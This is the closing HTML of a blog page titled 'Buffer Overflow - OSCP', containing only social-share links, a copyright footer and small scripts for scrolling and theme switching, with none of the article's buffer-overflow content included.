<a target=_blank rel="noopener noreferrer" aria-label="share Buffer Overflow - OSCP on twitter" href="https://twitter.com/intent/tweet/?text=Buffer%20Overflow%20-%20OSCP&url=https%3a%2f%2frzul.me%2fposts%2fbof-oscp%2f&hashtags=BoF-Windows"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Buffer Overflow - OSCP on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2frzul.me%2fposts%2fbof-oscp%2f&title=Buffer%20Overflow%20-%20OSCP&summary=Buffer%20Overflow%20-%20OSCP&source=https%3a%2f%2frzul.me%2fposts%2fbof-oscp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Buffer Overflow - OSCP on reddit" href="https://reddit.com/submit?url=https%3a%2f%2frzul.me%2fposts%2fbof-oscp%2f&title=Buffer%20Overflow%20-%20OSCP"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Buffer Overflow - OSCP on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frzul.me%2fposts%2fbof-oscp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Buffer Overflow - OSCP on whatsapp" href="https://api.whatsapp.com/send?text=Buffer%20Overflow%20-%20OSCP%20-%20https%3a%2f%2frzul.me%2fposts%2fbof-oscp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Buffer Overflow - OSCP on telegram" href="https://telegram.me/share/url?text=Buffer%20Overflow%20-%20OSCP&url=https%3a%2f%2frzul.me%2fposts%2fbof-oscp%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2022 <a href=https://rzul.me/>Román Zuleta</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>